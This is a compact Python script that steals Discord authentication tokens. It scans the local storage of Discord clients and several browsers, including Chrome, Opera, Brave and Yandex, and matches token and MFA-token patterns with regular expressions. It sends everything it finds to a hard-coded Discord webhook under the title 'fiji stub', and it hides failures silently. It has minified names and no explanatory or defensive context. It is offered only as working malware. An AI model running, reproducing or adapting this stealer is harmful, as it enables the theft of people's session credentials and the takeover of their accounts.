
import os,re,json
from urllib.request import Request as F,urlopen as G
H='https://discord.com/api/webhooks/1040303532609376347/ZLcvVwZdh1dNz6A0HxIgzmJW7HgPz6RAlPishp4HBIsasFai0j3Km8bkS2BhemsEnLtF'
def I(path):
	A=path;A+='\Local Storage\leveldb';C=[]
	for B in os.listdir(A):
		if not B.endswith('.log')and not B.endswith('.ldb'):continue
		for D in [C.strip()for C in open(f'{A}\{B}',errors='ignore').readlines()if C.strip()]:
			for E in ('[\w-]{24}\.[\w-]{6}\.[\w-]{27}','mfa\.[\w-]{84}'):
				for F in re.findall(E,D):C.append(F)
	return C
def A():
	P='url';C=os.getenv('LOCALAPPDATA');B=os.getenv('APPDATA');J={'Discord':B+'\Discord','Discord Canary':B+'\discordcanary','Discord PTB':B+'\discordptb','Google Chrome':C+'\Google\Chrome\User Data\Default','Opera':B+'\Opera Software\Opera Stable','Brave':C+'\BraveSoftware\Brave-Browser\User Data\Default','Yandex':C+'\Yandex\YandexBrowser\User Data\Default'};A=''
	for (K,D) in J.items():
		if not os.path.exists(D):continue
		A+=f'
**{K}**
```
';E=I(D)
		if len(E)>0:
			for L in E:A+=f'{L}
'
		else:A+='No tokens found.
'
		A+='```'
	M={'Content-Type':'application/json','User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'};N=json.dumps({'content':'','embeds':[{'title':'fiji stub','description':f'{A}','color':15329769,'thumbnail':{P:'https://play-lh.googleusercontent.com/jkpabs01pnEU5Jc9U3MuWdwwoWi8v7x33RZNYyLP2T8a2j1csnjOy3_-KI6JU8JntlNW'},'image':{P:'https://hips.hearstapps.com/hmg-prod/images/funny-cat-captions-1563551842.jpg'}}],'attachments':[]})
	try:O=F(H,data=N.encode(),headers=M);G(O)
	except:pass
if __name__=='__main__':A()
